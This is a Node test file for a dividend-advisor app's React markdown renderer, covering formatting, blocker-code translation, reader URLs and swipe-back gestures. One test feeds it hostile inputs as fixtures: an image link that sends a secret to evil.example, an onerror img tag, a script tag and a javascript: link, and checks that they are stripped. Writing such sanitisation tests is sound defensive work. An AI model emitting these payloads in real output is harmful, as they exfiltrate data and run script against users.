import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { registerHooks } from 'node:module';
import test from 'node:test';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import ts from 'typescript';
import { DIVIDEND_ADVISOR_READER_HASH, dividendAdvisorReaderUrl, isDividendAdvisorBackSwipe } from '../src/lib/dividendAdvisorNavigation.ts';

registerHooks({
  load(url, context, nextLoad) {
    if (url.endsWith('.tsx')) return {
      format: 'module', shortCircuit: true,
      source: ts.transpileModule(readFileSync(new URL(url), 'utf8'), { compilerOptions: { jsx: ts.JsxEmit.ReactJSX, target: ts.ScriptTarget.ES2023, module: ts.ModuleKind.ESNext } }).outputText,
    };
    return nextLoad(url, context);
  },
});
const { default: DividendAdvisorMarkdown } = await import('../src/components/DividendAdvisorMarkdown.tsx');

test('advice rendering turns headings, bold text and lists into readable elements', () => {
  const html = renderToStaticMarkup(createElement(DividendAdvisorMarkdown, { children: '## 当前结论\n\n**继续观察**，等待计划条件。\n\n- 先核对仓位\n- 再检查报价\n\n1. 记录计划\n2. 复核差异' }));
  assert.match(html, /<h2>当前结论<\/h2>/);
  assert.match(html, /<strong>继续观察<\/strong>/);
  assert.match(html, /<ul>/);
  assert.match(html, /<ol>/);
  assert.doesNotMatch(html, /\*\*|## 当前结论/);
});

test('advice rendering safely handles tables, links and untrusted model output without loading images or HTML', () => {
  const html = renderToStaticMarkup(createElement(DividendAdvisorMarkdown, { children: '| 项目 | 结论 |\n| --- | --- |\n| 仓位 | 待确认 |\n\n[来源](https://example.com/source)\n\n![tracking](https://evil.example/collect?secret=value)\n\n<img src="https://evil.example/raw" onerror="alert(1)">\n\n<script>alert(1)</script>\n\n[危险链接](javascript:alert%281%29)' }));
  assert.match(html, /class="div-advisor-markdown-table"><table>/);
  assert.match(html, /href="https:\/\/example.com\/source" target="_blank" rel="noopener noreferrer"/);
  assert.doesNotMatch(html, /<img|<script|evil\.example|javascript:|onerror/);
});

test('saved pricing explanations render readable reasons instead of internal blocker codes', () => {
  const html = renderToStaticMarkup(createElement(DividendAdvisorMarkdown, { language: 'zh', children: '历史记录：`payout_above_100`，`fcf_below_150`。' }));
  assert.doesNotMatch(html, /payout_above_100|fcf_below_150/);
  assert.match(html, /历史派息率超过100%/);
  assert.match(html, /现金流覆盖不足150%/);
});

test('the reading route retains the app address and query and replaces only the fragment', () => {
  const address = dividendAdvisorReaderUrl('https://localhost/?mode=mobile#old-page');
  assert.equal(address, `https://localhost/?mode=mobile${DIVIDEND_ADVISOR_READER_HASH}`);
});

test('back gesture recognises an intentional right swipe from the left edge without treating reading scroll as back', () => {
  assert.equal(isDividendAdvisorBackSwipe({ x: 20, y: 300 }, { x: 140, y: 315 }), true);
  assert.equal(isDividendAdvisorBackSwipe({ x: 20, y: 300 }, { x: 50, y: 600 }), false);
  assert.equal(isDividendAdvisorBackSwipe({ x: 100, y: 300 }, { x: 240, y: 305 }), false);
  assert.equal(isDividendAdvisorBackSwipe({ x: 20, y: 300 }, { x: 180, y: 400 }), false);
  assert.equal(isDividendAdvisorBackSwipe({ x: 20, y: 300 }, { x: 0, y: 310 }), false);
});
